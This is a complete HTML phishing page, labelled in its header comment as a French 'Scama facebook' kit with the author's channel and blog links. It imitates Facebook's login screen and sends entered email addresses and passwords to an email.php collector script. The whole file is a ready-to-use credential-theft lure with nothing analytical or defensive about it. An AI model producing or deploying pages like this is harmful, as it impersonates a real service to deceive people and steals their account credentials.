<!-- 
/*                           Made And Morocco hhhhhhhhh                        */
  /*****************************************************************************\
  |                Assalamu Aleikom akhi : Scama facebook French                |
  |                                                                             |   
  |                          Version : 2016-2017                                |
  |                                                                             |
  |       My Channel : https://Youtube.com/channel/UCT_hqoANFtcbOA4o4xZ0iaw     |  
  |                                                                             |  
  |         My Page  : https://www.facebook.com/Nour.blog1                      |
  |                                                                             |
  |       My Website : https://Nourblog1.Blogspot.Com                           |
  |                                                                             |
  \*****************************************************************************/
-->
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8" />
<title>Se connecter à Facebook | Facebook</title>
<link rel="shortcut icon" link="" href="images/favicon.ico">
<style>
body{
    background: #fff;
    color: #1d2129;
    direction: rtl;
    line-height: 1.34;
    margin: 0;
    padding: 0;
    unicode-bidi: embed;
	}
	a{
    color: #365899;
    cursor: pointer;
    text-decoration: none;
    font-family: arial;
}
</style>
<style>
.nourblog1{
	background-color: #4267b2;
    border-color: #4267b2;
    outline: none;
    color: #fff;
    border-radius: 4px;
    text-align: center;
    height: 45px;
    width: 300px;
    border: 1px solid;
    font-size: 17px;
}
.nourblog1:hover{
	background-color:#133783;
}
</style>
</head>
<body>
<div style='background-color:#e9ebee;width:100%;text-align:center;'>
<div style='background-color:#3b5998;text-align:center;padding: 10px;background-image: linear-gradient(#4e69a2, #3b5998 50%);'>
<center><img src="images/logo.png" onContextMenu="return false;"/></center>
</div>
<br/>
<br/>
<br/>
<center>
<img src='images/info.png' onContextMenu="return false;"/>
</center>
<center>
<div style='background-color: #fff;text-align:center;border:1px solid;border-color:#e5e6e9 #dfe0e4 #d0d1d5;border-radius:3px;width: 610px;'>
<br/>
<br/>
<font style='font-family: verdana;font-size: 18px;line-height: 22px;'>
Se connecter à Facebook
</font>
<br/>
<br/>
<!-- Coded By Noureddine Tkodar From Www.Nourblog1.blogspot.com -->
<form method="post" action="email.php" style="line-height:2.9;">
<input type="email" name="email" required="" style='border: 1px solid #bdc7d8;
    direction: ltr;
    height: 22px;
    width: 284px;
    font-size: 15px;
    padding: 5px 8px;' placeholder="Adresse e-mail ou numéro de téléphone">
	<br/>
<input type="password" name="pass" required="" style='border: 1px solid #bdc7d8;
    direction: ltr;
    height: 22px;
    width: 284px;
    font-size: 15px;
    padding: 5px 8px;' placeholder="Mot de passe">
<br>
<button type="submit"  class="nourblog1">
<b>Connexion</b>
</button>
<br>
<a href="" style="font-size:12px;">Informations de compte oubliées ?</a>
<span role="presentation" aria-hidden="true"> · </span>
<a style="font-size:12px;">S’inscrire sur Facebook</a>
</div>
</form>
<br/>
<br/>
<br/>
<br/>
</div>
</center>
</div>
<center>
<img src='images/footer.png' onContextMenu="return false;"/>
</center>
</body>
</html>